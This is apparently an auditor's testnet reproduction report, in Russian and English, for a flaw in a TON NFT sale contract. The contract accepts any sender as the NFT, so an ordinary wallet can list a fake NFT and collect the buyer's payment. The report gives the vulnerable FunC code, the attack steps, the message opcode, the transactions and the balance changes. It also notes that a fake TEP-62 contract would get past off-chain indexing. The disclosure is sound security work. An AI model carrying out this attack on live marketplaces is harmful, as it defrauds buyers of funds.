# HYP-05 Reproduction Report

**Date:** 2026-05-15  
**Finding:** Fake NFT — нет TEP-62 on-chain validation в sale contract  
**PoC file:** `02-fake-nft-listing/poc-hyp05-full.js`  
**Conclusion:** ✅ TESTNET-CONFIRMED

---

## Environment

| Parameter | Value |
|---|---|
| OS | Windows 10 Pro 10.0.19045 |
| Node.js | v24.14.1 |
| Network | TON Testnet |
| Endpoint | https://testnet.toncenter.com/api/v2/jsonRPC |

---

## Vulnerability Mechanism (sale:330-355)

```func
if (~ is_initialized) {
    var (_, _, _, _, nft_address, _) = load_static_data(static_data_cell);

    throw_unless(500, equal_slices(sender_address, nft_address));  // единственная проверка
    throw_unless(501, op == op::ownership_assigned());
    slice prev_owner_address = in_msg_body~load_msg_addr();

    save_data(is_complete, marketplace_address, prev_owner_address, ...);
    return ();
}
```

Контракт проверяет **только** что `sender == nft_address`.  
Не проверяет: collection, TEP-62 compliance, derivation hash, interface.

---

## Attack Scenario

```
nft_address = attacker.wallet   ← обычный кошелёк, НЕ NFT-контракт
nft_owner   = addr_none         ← is_initialized = false
```

**Шаги атаки:**
1. Attacker деплоит sale contract с `nft_address = attacker.wallet`, `nft_owner = addr_none`
2. Attacker.wallet отправляет `op::ownership_assigned` (0x05138d91) на sale contract
3. Contract: `sender == nft_address` → ✅ принимает
4. Contract сохраняет `nft_owner = prev_owner` из тела сообщения (attacker указывает любой адрес)
5. `is_initialized = true` → sale готова к покупке
6. Buyer платит → `transfer_nft` → wallet поглощает → `is_complete=1`

---

## Before State

| Wallet | Role | Address | Balance |
|---|---|---|---|
| Auditor | Deployer + Buyer | `kQBcQeVDhlytSlreZCE0lQBDDuwqzJU0XSZT4Ylq2Yoai2su` | 2.940855 TON |
| Attacker | Fake NFT address | `kQCvPAknwpT9a9dSCCtF_RdRh2bssBmuOBNG0hamNL5EuFwc` | 0.982211 TON |

Sale contract parameters:
```
nft_address          = attacker.wallet  (обычный кошелёк)
nft_owner            = addr_none        (is_initialized=false)
marketplace_address  = auditor.wallet
full_price           = 0.01 TON
```

Sale contract: `kQAZ5uXtq_n8Q2jk9SaFsaW4CgCSJkrh25hCaeGGLUiF_bWz`  
Raw: `0:19e6e5edabf9fc4368e4f52685b1a5b80a0092264ae1db984269e1862d4885fd`

---

## TX Sequence

### TX1 — Deploy (Auditor → Sale contract)

Sale contract создан с `nft_owner = addr_none`.  
`get_fix_price_data_v4()` до init: getter не может читать addr_none через SDK (возвращает undefined) — ожидаемо.

### TX2 — ownership_assigned (Attacker.wallet → Sale contract)

Message body:
```
op:         0x05138d91 (ownership_assigned)
query_id:   0
prev_owner: auditor.wallet.address  ← attacker указывает кого угодно
```

**Результат:**
```
nft_owner:    kQBcQeVDhlytSlreZCE0lQBDDuwqzJU0XSZT4Ylq2Yoai2su  ✅
is_complete:  false (ещё не куплено)
is_initialized: TRUE
```

Контракт принял ownership_assigned от кошелька (`attacker.wallet`) как от "NFT-контракта".  
**Нет проверки что sender является валидным TEP-62 NFT.**

### TX3 — Purchase (Auditor → Sale contract, op=0)

```
msg_value: 0.12 TON
```

**Результат:**
```
is_complete: 1  ✅
nft_owner:   auditor (не изменился — нет реального NFT)
```

---

## After State

| Wallet | Balance After | Delta |
|---|---|---|
| Auditor | 2.778733 TON | -0.162122 TON (deploy 0.05 + buy 0.12 - возврат - user_amount) |
| Attacker | 1.138888 TON | **+0.156677 TON** (получил NFT msg mode=128 с остатком баланса) |

Sale contract:
```
state:       active
balance:     0 TON
is_complete: 1
nft_owner:   auditor.wallet (unchanged — реального NFT не было)
```

---

## Expected vs Actual

| Check | Expected | Actual | Pass |
|---|---|---|---|
| ownership_assigned от wallet принят | ✅ | ✅ | ✅ |
| nft_owner = prev_owner из msg | ✅ | ✅ (= auditor) | ✅ |
| is_initialized = true после init | ✅ | ✅ | ✅ |
| Purchase: is_complete=1 | ✅ | ✅ | ✅ |
| Нет on-chain TEP-62 проверки | ✅ | ✅ (код подтверждён) | ✅ |

---

## Off-chain Mitigation Test

Отдельный тест через GetGems API (`poc-hyp05.js`):

| Тест | Результат |
|---|---|
| Attacker wallet как NFT в tonapi | `{"error":"item not found"}` — не индексируется |
| Sale contract с fake nft_address в tonapi | `active, get_fix_price_data_v4` — видим как контракт, но не как NFT listing |
| GetGems GraphQL (`alphaNftItemByAddress`) | `403: USE_TONAPI` — redirected |

**Вывод:** GetGems/tonapi НЕ индексирует plain wallet как NFT.  
Off-chain митигация блокирует тупую атаку (wallet-as-nft в UI не виден).

**Но:** fake TEP-62 contract (реализует `get_nft_data`) был бы проиндексирован.  
On-chain защиты НЕТ — sale contract принимает любой адрес как nft_address.

---

## Vulnerability Code Path

```
sale:206 — is_initialized = nft_owner_address.slice_bits() > 2
             addr_none (2 bits) → false

sale:330 — if (~ is_initialized) {
sale:340 —     throw_unless(500, equal_slices(sender_address, nft_address));
               ↑ ЕДИНСТВЕННАЯ ПРОВЕРКА: sender == nft_address
               НЕТ: collection check, TEP-62 interface, derivation

sale:341 —     throw_unless(501, op == op::ownership_assigned());
sale:342 —     slice prev_owner = in_msg_body~load_msg_addr();
sale:344 —     save_data(..., prev_owner, ...);  // nft_owner = любой адрес из msg
sale:355 — }
```

---

## Conclusion

**✅ TESTNET-CONFIRMED**

**On-chain доказательства:**
- Contract: `kQAZ5uXtq_n8Q2jk9SaFsaW4CgCSJkrh25hCaeGGLUiF_bWz`
- TX2 (ownership_assigned): принят от `attacker.wallet` → `nft_owner = auditor` сохранён
- TX3 (purchase): `is_complete=1`, attacker получил +0.156677 TON через NFT msg
- Raw data подтверждает: `is_complete=1`, контракт полностью выполнен

**Severity:** Critical (on-chain) / High (если GetGems backend блокирует non-TEP-62 адреса)  
**Blocker on-chain:** отсутствует  
**Off-chain mitigation:** частичная — wallet не индексируется, fake TEP-62 contract — да
